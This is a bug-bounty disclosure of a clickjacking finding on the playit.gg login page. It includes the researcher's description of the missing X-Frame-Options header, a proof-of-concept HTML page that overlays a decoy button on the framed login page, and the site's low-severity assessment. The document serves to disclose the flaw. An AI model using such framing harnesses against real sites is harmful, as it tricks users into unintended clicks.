# Missing headers to prevent iframe allow for possible clickjacking

Date: September 2, 2026<br/>
Classification: **Low**<br/>
Source: `Kunal Mhaske` [linkedin.com/in/kunal-mhaske-59928a170](https://www.linkedin.com/in/kunal-mhaske-59928a170)<br/>
Payment: $100<br/>

### Original Report

```
Vulnerability Name: Clickjacking

Target URL: https://playit.gg/login

Vulnerability Description :

Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.

The server didn't return an X-Frame-Options header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.

Typically there is one type of attack - cross-site request forgeries (CSRF) that can interact with functions on other websites.

This vulnerability affects the Web Server.


<html>
   <head>
     <title>Clickjack test page</title>
   </head>
   <style>
    #myBtn{
     
        z-index: 999;
    position: absolute;
    top: 100px;
    right: 50px;
    color: white;
    background-color: red;
    }
    </style>
 
 
 
   <body>
   <!-- <h1> A Sample Test Page </h1>
     <p>Website is vulnerable to clickjacking! </p>
   
     <p>Avoid random clicks </p> -->
<div style="z-index:-9999; position:absolute;top:0; left:0;width: 70%; height:70%">
<iframe src="https://playit.gg/login" width="100%" height="100%" >
 
</iframe></div>
<div align="right" style="position:absolute; top:1; left:0; z-index:1; width: 70%;height:60%; text-align:left;">
<a href="https://www.bing.com/"><button id="myBtn"> click here</button></a>

<a href="https://playit.gg/login">Open Modal</button></a> 
<div id="myModal" class="modal">

  <!-- Modal content -->
 

</div>
</body>
</html>

2.save it as <anyname>.html eg s.html
3. and just simply open that. And click on the button directly https://bing.com/
As far as I know, this data is enough to prove that your site is vulnerable to Clickjacking.
```

This is a valid security issue, though our assessment is that practical exploitation is limited by the multiple clicks and typed confirmations required for sensitive actions.


